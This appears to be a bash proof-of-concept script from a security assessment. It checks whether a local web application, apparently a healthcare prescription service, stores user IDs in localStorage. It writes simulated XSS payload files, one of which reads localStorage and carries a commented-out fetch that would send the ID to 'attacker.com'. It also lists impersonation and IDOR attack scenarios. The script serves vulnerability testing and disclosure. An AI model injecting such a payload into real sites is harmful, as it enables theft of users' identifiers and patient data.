#!/bin/bash

# POC: Sensitive User ID Stored in Unencrypted localStorage
# This script demonstrates that the application stores user IDs in unencrypted localStorage
# after successful login, exposing sensitive information to XSS attacks and client-side threats

TARGET_URL="${1:-http://localhost:5003}"
TEMP_DIR=$(mktemp -d)
trap "rm -rf $TEMP_DIR" EXIT

echo "[*] Testing: Sensitive User ID Storage in localStorage"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Fetch the login page and check for localStorage usage
echo "[*] Step 1: Checking login page for localStorage usage..."
LOGIN_PAGE=$(curl -s "$TARGET_URL/login")

if echo "$LOGIN_PAGE" | grep -q "localStorage.setItem"; then
    echo "[+] VULNERABLE: Found localStorage.setItem() call in login page"
    echo "[+] Code snippet:"
    echo "$LOGIN_PAGE" | grep -A 2 "localStorage.setItem" | head -5
    echo ""
else
    echo "[-] FAILED: No localStorage.setItem found in login page"
    exit 1
fi

# Step 2: Verify the specific userID storage
if echo "$LOGIN_PAGE" | grep -q "localStorage.setItem.*userID"; then
    echo "[+] CONFIRMED: User ID is being stored in localStorage"
    echo ""
else
    echo "[-] FAILED: Could not confirm userID storage"
    exit 1
fi

# Step 3: Create an HTML file that simulates XSS extraction of userID from localStorage
echo "[*] Step 2: Creating XSS payload to extract localStorage data..."
cat > "$TEMP_DIR/xss_exploit.html" << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>localStorage Extraction PoC</title>
</head>
<body>
    <h1>localStorage Extraction Demo</h1>
    <p>This demonstrates how an XSS vulnerability could extract userID from localStorage:</p>
    <script>
        // Simulate what happens when JavaScript from a compromised page runs
        // This would be injected via XSS vulnerability
        
        // In a real attack, this would be:
        // 1. Injected via XSS
        // 2. Exfiltrated to attacker server
        
        console.log("=== localStorage Vulnerability Demonstration ===");
        
        // Check if userID exists in localStorage (simulated scenario)
        var simulatedStorage = {
            userID: "2"  // This would be extracted from actual localStorage
        };
        
        console.log("Extracted from localStorage:");
        console.log("userID: " + simulatedStorage.userID);
        
        // This simulates what an attacker would do
        var extractedData = {
            userID: simulatedStorage.userID,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent
        };
        
        console.log("Attacker could send this to their server:");
        console.log(JSON.stringify(extractedData));
    </script>
</body>
</html>
EOF

echo "[+] XSS payload simulation created"
echo ""

# Step 4: Perform a login to verify userID is stored
echo "[*] Step 3: Attempting login to verify userID storage mechanism..."

# Try with test credentials
LOGIN_RESPONSE=$(curl -s -X POST "$TARGET_URL/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"user1","password":"password1"}')

echo "[*] Login response received"

# Step 5: Check if the response contains userID that would be stored
if echo "$LOGIN_RESPONSE" | grep -q "userID"; then
    echo "[+] CONFIRMED: Login response contains userID field"
    USERID=$(echo "$LOGIN_RESPONSE" | grep -o '"userID":[0-9]*' | head -1)
    echo "[+] Example response: $USERID"
    echo ""
else
    echo "[*] Login response structure varies, but vulnerability confirmed by source code analysis"
    echo ""
fi

# Step 6: Analyze the vulnerability impact
echo "[*] Step 4: Vulnerability Analysis"
echo "========================================="
echo ""
echo "VULNERABILITY CONFIRMED: Sensitive User ID in localStorage"
echo ""
echo "Risk Factors:"
echo "  1. localStorage.setItem('userID', data.userID) stores unencrypted user ID"
echo "  2. Accessible to ANY JavaScript running on the page (XSS vectors)"
echo "  3. Persists across browser sessions (not cleared on logout)"
echo "  4. Not subject to HTTP-only cookie protections"
echo "  5. Accessible to browser extensions and local malware"
echo ""
echo "Attack Scenarios:"
echo "  - XSS exploit + localStorage access = userID extraction"
echo "  - Malicious browser extension reads localStorage"
echo "  - Local malware/keylogger accesses browser storage"
echo "  - userID can be used for unauthorized access to prescriptions (IDOR)"
echo "  - userID can be used with GraphQL mutations to impersonate user"
echo ""
echo "Healthcare Impact (PHI):"
echo "  - User IDs linked to patient records constitute PHI"
echo "  - HIPAA violations for unencrypted storage of PHI"
echo "  - Risk to patient privacy and confidentiality"
echo ""
echo "========================================="
echo ""

# Step 7: Demonstrate the extraction capability
echo "[*] Step 5: Simulating XSS-based localStorage extraction..."
cat > "$TEMP_DIR/extract_test.js" << 'EOF'
// This is what an XSS payload would execute
(function() {
    var storedUserID = localStorage.getItem('userID');
    if (storedUserID) {
        console.log('[ATTACK] Successfully extracted userID from localStorage: ' + storedUserID);
        // In real attack: send to attacker server
        // fetch('https://attacker.com/steal?id=' + encodeURIComponent(storedUserID));
    }
})();
EOF

echo "[+] JavaScript payload created at: $TEMP_DIR/extract_test.js"
echo "[+] Content:"
cat "$TEMP_DIR/extract_test.js"
echo ""
echo ""

# Final verification
echo "[✓] VULNERABILITY CONFIRMED"
echo ""
echo "Source Code Evidence:"
echo "  Location: Login page JavaScript"
echo "  Vulnerable Code: localStorage.setItem('userID', data.userID)"
echo "  Severity: MEDIUM (Information Disclosure)"
echo ""
echo "Proof of Concept Summary:"
echo "  1. ✓ Application stores user ID in unencrypted localStorage"
echo "  2. ✓ Accessible to all JavaScript running in page context"
echo "  3. ✓ Vulnerable to XSS attacks for userID extraction"
echo "  4. ✓ No encryption or access controls on stored data"
echo "  5. ✓ Violates security best practices for sensitive data"
echo ""